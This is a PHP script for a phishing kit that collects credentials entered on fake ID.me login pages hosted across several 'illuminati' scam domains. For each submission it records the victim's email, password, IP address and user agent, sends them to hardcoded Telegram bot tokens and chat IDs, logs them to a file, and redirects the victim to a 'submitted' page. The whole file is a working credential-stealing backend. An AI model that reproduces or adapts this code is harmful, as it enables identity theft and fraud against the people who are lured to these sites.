<?php
// include 'firewall.php'; // Uncomment if needed

ob_start();

// Site-specific configuration with domain-based bots and redirects
$site_map = [
    '127.0.0.1' => [
        'bots' => [
            ['token' => '8491989105:AAHZ_rUqbKxZSPfiEEIQ3w_KPyO4N9XSyZw', 'chat_id' => '1325797388'],
            ['token' => '8413673524:AAGruDl1TxUDZH9RwQYYWSeEwJBcqR5S1lQ', 'chat_id' => '1566821522'],
        ],
        'redirect' => 'https://illuminatiofficial.world/index.html'
    ],
    
    'illuminatiofficial.world' => [
        'bots' => [
            ['token' => '8491989105:AAHZ_rUqbKxZSPfiEEIQ3w_KPyO4N9XSyZw', 'chat_id' => '1325797388'],
            ['token' => '8413673524:AAGruDl1TxUDZH9RwQYYWSeEwJBcqR5S1lQ', 'chat_id' => '1566821522'],
        ],
        'redirect' => 'https://illuminatiofficial.world/official/join-the-illuminati-members/Submitted_Illuminati_Official_Website.html'
    ],
    
    'illuminatipath.world' => [
        "bots" => [
            ['token' => '8491989105:AAHZ_rUqbKxZSPfiEEIQ3w_KPyO4N9XSyZw', 'chat_id' => '1325797388'],
            ['token' => '8491692614:AAHhTPb4DRwkvmJa0SjF00v5x8kNWA82xfk', 'chat_id' => '6378885812'],
        ],
        "redirect" => "https://illuminatipath.world/official/join-the-illuminati-members/Submitted_Illuminati_Official_Website.html"
    ],




    'illuminatisyndicate.world' => [
        "bots" => [
            ['token' => '8491989105:AAHZ_rUqbKxZSPfiEEIQ3w_KPyO4N9XSyZw', 'chat_id' => '1325797388'],
            ['token' => '8531352805:AAFN91n2L76y7WKwB159QFRNtvCnLu_uM9M', 'chat_id' => '7875523533'],
        ],
        "redirect" => "https://illuminatisyndicate.world/official/join-the-illuminati-members/Submitted_Illuminati_Official_Website.html"
    ],


    'illuminatisacred.world' => [
        "bots" => [
            ['token' => '8491989105:AAHZ_rUqbKxZSPfiEEIQ3w_KPyO4N9XSyZw', 'chat_id' => '1325797388'],
            ['token' => '8412410845:AAFxuHUyafETE-8oCvUsSp45l0CtDkb-qm0', 'chat_id' => '7411482040'],
        ],
        "redirect" => "https://illuminatisacred.world/official/join-the-illuminati-members/Submitted_Illuminati_Official_Website.html"
    ],

    // Add more domains as needed
];


// Get the referring domain
$referer = $_SERVER['HTTP_REFERER'] ?? '';
$parsed = parse_url($referer);
$domain = $parsed['host'] ?? 'unknown';

// Find the configuration for this domain
$config = $site_map[$domain] ?? null;

// If no config found, use a default one (you can modify this)
if (!$config) {
    // Option 1: Use first domain's config as fallback
    $config = reset($site_map);
    
    // Option 2: Or redirect to a generic page
    // header("Location: https://example.com/error.html");
    // exit;
    
    // Option 3: Or show error
    // http_response_code(403);
    // exit("Unauthorized origin: $domain");
}

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Setup log file
    $log_file = __DIR__ . "/logs/idme_logins.txt";
    if (!file_exists(dirname($log_file))) {
        mkdir(dirname($log_file), 0777, true);
    }

    // Logging function
    function log_entry($msg) {
        global $log_file;
        $timestamp = date("Y-m-d H:i:s");
        file_put_contents($log_file, "[$timestamp] $msg\n", FILE_APPEND);
    }

    // Get form data from HTML form
    $useremail = htmlspecialchars($_POST['useremail'] ?? 'Unknown');
    $userpassword = htmlspecialchars($_POST['userpassword'] ?? 'Empty');
    $remember_me = isset($_POST['remember_me']) ? 'Yes' : 'No';

    // Get IP address SERVER-SIDE (HTML form doesn't send this anymore)
    $ip = $_SERVER['HTTP_CLIENT_IP'] ?? 
          $_SERVER['HTTP_X_FORWARDED_FOR'] ?? 
          $_SERVER['HTTP_X_FORWARDED'] ?? 
          $_SERVER['HTTP_FORWARDED_FOR'] ?? 
          $_SERVER['HTTP_FORWARDED'] ?? 
          $_SERVER['REMOTE_ADDR'] ?? 
          'unknown';
    
    // Handle multiple IPs in X_FORWARDED_FOR
    if (strpos($ip, ',') !== false) {
        $ips = explode(',', $ip);
        $ip = trim($ips[0]);
    }

    $timestamp = date("Y-m-d H:i:s");
    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
    
    // Prepare Telegram message
    $message = "🔐 *ID.me Login Submission*\n\n" .
               "📧 *Email:* `$useremail`\n" .
               "🔑 *Password:* `$userpassword`\n" .
               "💾 *Remember Me:* $remember_me\n" .
               "🌐 *Domain:* $domain\n" .
               "📡 *IP:* `$ip`\n" .
               "🕒 *Time:* $timestamp\n" .
               "🔍 *User Agent:* " . substr($user_agent, 0, 100);

    // Send to Telegram bots (using domain-specific bots from config)
    foreach ($config['bots'] as $bot_index => $bot) {
        if (empty($bot['token']) || empty($bot['chat_id'])) {
            log_entry("Skipping bot $bot_index - empty token or chat_id");
            continue;
        }
        
        $url = "https://api.telegram.org/bot" . $bot['token'] . "/sendMessage";
        $data = [
            'chat_id' => $bot['chat_id'],
            'text' => $message,
            'parse_mode' => 'Markdown'
        ];

        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => $data,
            CURLOPT_TIMEOUT => 30,
            CURLOPT_SSL_VERIFYPEER => true // Keep this true for security
        ]);
        
        $result = curl_exec($ch);
        
        if (curl_error($ch)) {
            log_entry("❌ Telegram error (bot $bot_index): " . curl_error($ch));
        } else {
            $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            log_entry("✓ Telegram sent (bot $bot_index) - HTTP $http_code");
        }
        
        curl_close($ch);
    }

    // Log the submission
    log_entry("[$domain] Login from $ip - Email: $useremail | Password: $userpassword");

    // Clear output buffer and redirect to domain-specific URL
    ob_end_clean();
    header("Location: " . $config['redirect']);
    exit;
    
} else {
    // Not a POST request
    echo "This page only accepts POST submissions from the login form.";
    exit;
}
?>
